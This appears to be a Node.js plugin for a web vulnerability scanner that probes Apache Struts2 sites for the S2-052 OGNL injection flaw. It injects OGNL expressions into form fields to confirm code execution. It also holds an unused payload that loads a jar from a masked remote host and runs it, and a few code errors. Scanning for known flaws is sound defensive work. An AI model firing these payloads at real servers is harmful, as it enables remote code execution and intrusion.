
module.exports={
	tags:"struts2,parms,ognl",
  des:"struts2 052Vulnerability detection",
  dependencies:"",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-052",
		""],
	urls:[
    "https://cwiki.apache.org/confluence/display/WW/S2-052"],
    doCk:function(url,fnCbk,parms,szPayload,fnCbk1)
    {
      var _t = this,_s = _t.self;
      if(!parms)
      {
        _s.request.get(url,function(e,r,b)
        {
          if(!e && b)
          {
            _s.fnDoForm(b,url,r,"ognl");
          }
        });
        return;
      }
      
      var szData = '';
      var szOldUrl = url;
      for(var k in parms)
      {
        szData += k + "= " + encodeURIComponent(szPayload) + "&";
        parms[k]=szPayload;
      }
      _s.request(_s.fnOptHeader({method: 'POST',uri: url + "?&" + szData,
      formData:parms,
        headers:{
          "content-type":"multipart/form-data",
          "user-agent": _s.g_szUa
        }
      }),
      fnCbk1);
    },
	doCheck:function (url,fnCbk,parms)
	{
    var _t = this,_s = _t.self,
        szVl = "_struts2_ognl" + new Date().getTime,
    szPay0 = `#cl=new java.net.URLClassLoader(new java.net.URL[]{` 
    + `new java.net.URL('http://*.*.*.*/mtx.jar')}), #lc=#cl.loadClass('Hello'),`
    + `#o=#lc.newInstance(), #o.hello()`,
    szPayload = "#{@org.apache.struts2.ServletActionContext@getResponse().addHeader('struts2','" + szVl + "')}";
    this.doCk(url,fnCbk,parms,szPayload,function(e,r,b)
    {
      if(e)_s.error(e);
        else if(r && r.headers)
        {
          var szHd = '';
          if(szHd = r.headers['struts2'])
          {
  				  fnCbk({"url":url,result:szHd,payload:szPayload,vul:true},_t);
          }
        }
    });

    var n1 = new Date().getTime(),n = 77 + n1; 
    var szPayload1 = "#{77 + " + n1 + "}";
    this.doCk(url,fnCbk,parms,szPayload1,function(e,r,b)
    {
        var i = 0;
        if(e)_s.error(e);
        else if(b && -1 < (i = (b = String(b)).indexOf(n)))
        {
  				  fnCbk({"url":url,result:b.substr(i - szPayload1.length - 10, szPayload1.length() * 3),payload:szPayload1,vul:true},_t);
        }
    });
	}
};